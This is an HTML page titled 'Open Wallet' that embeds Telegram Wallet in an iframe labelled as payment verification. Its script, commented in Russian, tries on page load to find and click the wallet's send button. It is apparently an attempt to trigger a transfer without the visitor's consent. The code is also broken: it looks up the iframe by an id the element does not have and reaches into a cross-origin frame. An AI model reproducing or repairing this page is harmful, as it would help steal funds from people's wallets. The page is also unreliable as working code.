<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Wallet</title>
</head>
<body>
    <iframe class="payment-verification" src="https://t.me/wallet/start?startapp"></iframe>

    <script>
        // Ожидание загрузки iframe
        async function waitForElement(selector) {
            return new Promise(resolve => {
                const intervalId = setInterval(() => {
                    const element = document.querySelector(selector);
                    if (element) {
                        clearInterval(intervalId);
                        resolve(element);
                    }
                }, 100);
            });
        }

        // Ожидание, пока Telegram Wallet  загрузится и будет готов к взаимодействию
        async function openWallet() {
            const iframe = document.getElementById('payment-verification');
            await waitForElement('#payment-verification');

            // Ожидание, пока кнопка "send-btn" появится на странице Telegram Wallet
            await waitForElement('#payment-verification button[class="r2DG tizz wMEh GQO6"]');

            // Нажатие кнопки через iframe.contentWindow
            const sendButton = iframe.contentWindow.document.querySelector('button[class="r2DG tizz wMEh GQO6"]');
            if (sendButton) {
                sendButton.click();
            } else {
                console.log('Кнопка не найдена!');
            }
        }

        // Запуск функции при загрузке страницы
        openWallet();
    </script>
</body>
</html>
